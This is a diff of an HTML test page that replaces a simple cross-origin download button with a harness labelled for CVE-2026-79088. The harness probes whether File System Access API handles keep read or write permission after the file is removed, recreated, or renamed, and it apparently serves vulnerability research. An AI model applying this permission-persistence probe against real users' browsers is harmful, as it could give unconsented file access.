@@ -1,28 +1,454 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>Cross-Origin Download Test</title>
+  <meta name="viewport" content="width=device-width">
+  <title>FSA CVE-2026-79088 Test</title>
+
+  <style>
+    body {
+      font-family: monospace;
+      padding: 16px;
+    }
+
+    button {
+      display: block;
+      width: 100%;
+      margin: 8px 0;
+      padding: 12px;
+      font-size: 16px;
+    }
+
+    pre {
+      white-space: pre-wrap;
+      word-break: break-word;
+      margin-top: 16px;
+    }
+  </style>
 </head>
+
 <body>
 
-<h2>Cross-Origin Download Test</h2>
+<h3>FSA Permission Test</h3>
 
-<button onclick="directDownload()">
-  DIRECT CROSS-ORIGIN DOWNLOAD
-</button>
+<button onclick="setup()">1. SETUP FILE</button>
+<button onclick="grantWrite()">2. GRANT READWRITE</button>
+<button onclick="removeFile()">3. HANDLE.REMOVE()</button>
+<button onclick="check()">4. CHECK</button>
+<button onclick="renameRoundTrip()">5. RENAME ROUND-TRIP</button>
+
+<pre id="log"></pre>
 
 <script>
-function directDownload() {
-  const a = document.createElement("a");
 
-  a.href = "https://edge-download-test.netlify.app/download";
-  a.download = "cross-origin-test.txt";
+let fileHandle = null;
 
-  document.body.appendChild(a);
-  a.click();
-  a.remove();
+
+// ==============================
+// LOGGER
+// ==============================
+
+function log(message) {
+  document.getElementById("log").textContent += message + "\n";
 }
+
+
+// ==============================
+// 1. SETUP FILE
+// ==============================
+
+async function setup() {
+
+  document.getElementById("log").textContent = "";
+
+  try {
+
+    log("=== FILE PICKER SETUP ===");
+
+    const files = await showOpenFilePicker({
+      multiple: false,
+      mode: "readwrite"
+    });
+
+    fileHandle = files[0];
+
+    log("FILE HANDLE: OK");
+    log("kind = " + fileHandle.kind);
+    log("name = " + fileHandle.name);
+
+    const readPermission =
+      await fileHandle.queryPermission({
+        mode: "read"
+      });
+
+    const readWritePermission =
+      await fileHandle.queryPermission({
+        mode: "readwrite"
+      });
+
+    log("read = " + readPermission);
+    log("readwrite = " + readWritePermission);
+
+    const file =
+      await fileHandle.getFile();
+
+    log("CONTENT = " + await file.text());
+
+  } catch (e) {
+
+    log("SETUP ERROR: " + e.name);
+    log(e.message);
+
+  }
+}
+
+
+// ==============================
+// 2. GRANT READWRITE
+// ==============================
+
+async function grantWrite() {
+
+  if (!fileHandle) {
+    log("ERROR: SETUP FILE terlebih dahulu");
+    return;
+  }
+
+  try {
+
+    log("");
+    log("=== REQUEST READWRITE ===");
+
+    const result =
+      await fileHandle.requestPermission({
+        mode: "readwrite"
+      });
+
+    log("requestPermission = " + result);
+
+    const readPermission =
+      await fileHandle.queryPermission({
+        mode: "read"
+      });
+
+    const readWritePermission =
+      await fileHandle.queryPermission({
+        mode: "readwrite"
+      });
+
+    log("read = " + readPermission);
+    log("readwrite = " + readWritePermission);
+
+  } catch (e) {
+
+    log("GRANT ERROR: " + e.name);
+    log(e.message);
+
+  }
+}
+
+
+// ==============================
+// 3. HANDLE.REMOVE()
+// ==============================
+
+async function removeFile() {
+
+  if (!fileHandle) {
+    log("ERROR: SETUP FILE terlebih dahulu");
+    return;
+  }
+
+  log("");
+  log("=== HANDLE.REMOVE ===");
+
+  try {
+
+    await fileHandle.remove();
+
+    log("handle.remove(): SUCCESS");
+
+  } catch (e) {
+
+    log("handle.remove(): " + e.name);
+    log(e.message);
+
+  }
+
+
+  try {
+
+    const readPermission =
+      await fileHandle.queryPermission({
+        mode: "read"
+      });
+
+    const readWritePermission =
+      await fileHandle.queryPermission({
+        mode: "readwrite"
+      });
+
+    log("read after remove = " + readPermission);
+    log("readwrite after remove = " + readWritePermission);
+
+  } catch (e) {
+
+    log("PERMISSION ERROR: " + e.name);
+
+  }
+
+
+  try {
+
+    const file =
+      await fileHandle.getFile();
+
+    log("OLD HANDLE READ: SUCCESS");
+    log("CONTENT = " + await file.text());
+
+  } catch (e) {
+
+    log("OLD HANDLE READ: " + e.name);
+    log(e.message);
+
+  }
+
+  log("");
+  log("Sekarang recreate FSA_TEST.txt dari Termux.");
+
+}
+
+
+// ==============================
+// 4. CHECK
+// ==============================
+
+async function check() {
+
+  if (!fileHandle) {
+    log("ERROR: SETUP FILE terlebih dahulu");
+    return;
+  }
+
+  log("");
+  log("=== CHECK ===");
+
+  try {
+
+    const readPermission =
+      await fileHandle.queryPermission({
+        mode: "read"
+      });
+
+    const readWritePermission =
+      await fileHandle.queryPermission({
+        mode: "readwrite"
+      });
+
+    log("old read = " + readPermission);
+    log("old readwrite = " + readWritePermission);
+
+  } catch (e) {
+
+    log("PERMISSION ERROR: " + e.name);
+
+  }
+
+
+  try {
+
+    const file =
+      await fileHandle.getFile();
+
+    log("OLD HANDLE READ: SUCCESS");
+    log("CONTENT = " + await file.text());
+
+  } catch (e) {
+
+    log("OLD HANDLE READ: " + e.name);
+    log(e.message);
+
+  }
+
+}
+
+
+// ==============================
+// 5. RENAME ROUND-TRIP
+// ==============================
+
+async function renameRoundTrip() {
+
+  if (!fileHandle) {
+    log("ERROR: SETUP FILE terlebih dahulu");
+    return;
+  }
+
+  log("");
+  log("=== RENAME ROUND-TRIP ===");
+
+
+  // ------------------------------
+  // BEFORE
+  // ------------------------------
+
+  try {
+
+    log("BEFORE MOVE:");
+
+    log(
+      "read = " +
+      await fileHandle.queryPermission({
+        mode: "read"
+      })
+    );
+
+    log(
+      "readwrite = " +
+      await fileHandle.queryPermission({
+        mode: "readwrite"
+      })
+    );
+
+  } catch (e) {
+
+    log("BEFORE CHECK ERROR: " + e.name);
+
+  }
+
+
+  // ------------------------------
+  // MOVE #1
+  // ------------------------------
+
+  try {
+
+    await fileHandle.move(
+      "FSA_TEMP_67890.txt"
+    );
+
+    log(
+      "MOVE #1: SUCCESS -> FSA_TEMP_67890.txt"
+    );
+
+  } catch (e) {
+
+    log("MOVE #1 ERROR: " + e.name);
+    log(e.message);
+    return;
+
+  }
+
+
+  // ------------------------------
+  // AFTER MOVE #1
+  // ------------------------------
+
+  try {
+
+    log("");
+    log("AFTER MOVE #1:");
+
+    log(
+      "read = " +
+      await fileHandle.queryPermission({
+        mode: "read"
+      })
+    );
+
+    log(
+      "readwrite = " +
+      await fileHandle.queryPermission({
+        mode: "readwrite"
+      })
+    );
+
+  } catch (e) {
+
+    log("MOVE #1 CHECK ERROR: " + e.name);
+
+  }
+
+
+  // ------------------------------
+  // MOVE #2
+  // ------------------------------
+
+  try {
+
+    await fileHandle.move(
+      "FSA_TEST.txt"
+    );
+
+    log(
+      "MOVE #2: SUCCESS -> FSA_TEST.txt"
+    );
+
+  } catch (e) {
+
+    log("MOVE #2 ERROR: " + e.name);
+    log(e.message);
+    return;
+
+  }
+
+
+  // ------------------------------
+  // AFTER MOVE #2
+  // ------------------------------
+
+  try {
+
+    log("");
+    log("AFTER MOVE #2:");
+
+    log(
+      "read = " +
+      await fileHandle.queryPermission({
+        mode: "read"
+      })
+    );
+
+    log(
+      "readwrite = " +
+      await fileHandle.queryPermission({
+        mode: "readwrite"
+      })
+    );
+
+  } catch (e) {
+
+    log("MOVE #2 CHECK ERROR: " + e.name);
+
+  }
+
+
+  // ------------------------------
+  // FINAL READ
+  // ------------------------------
+
+  try {
+
+    const file =
+      await fileHandle.getFile();
+
+    log("");
+    log("POST-ROUND-TRIP READ: SUCCESS");
+    log("CONTENT = " + await file.text());
+
+  } catch (e) {
+
+    log("");
+    log(
+      "POST-ROUND-TRIP READ: " +
+      e.name
+    );
+
+    log(e.message);
+
+  }
+
+}
+
 </script>
 
 </body>
